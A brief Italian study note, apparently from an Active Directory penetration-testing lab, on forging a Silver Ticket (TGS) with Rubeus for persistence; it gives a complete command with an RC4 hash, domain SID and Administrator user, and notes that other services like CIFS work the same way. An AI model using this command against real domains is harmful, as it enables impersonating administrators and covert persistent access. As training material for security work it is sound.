# Persistence - Silver Ticket - Rubeus

* Comando per forgiare un Silver Ticket (TGS)

```powershell
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-
dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d
/sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator
/domain:dollarcorp.moneycorp.local /ptt
```

* Come per il Golden Ticket (TGT), l'opzione /ldap esegue query sul DC per le informazioni relative all'utente.
* Comandi simili possono essere utilizzati per qualsiasi altro servizio in esecuzione sul host. (ES. HOST,RPCSS,CIFS e altri)
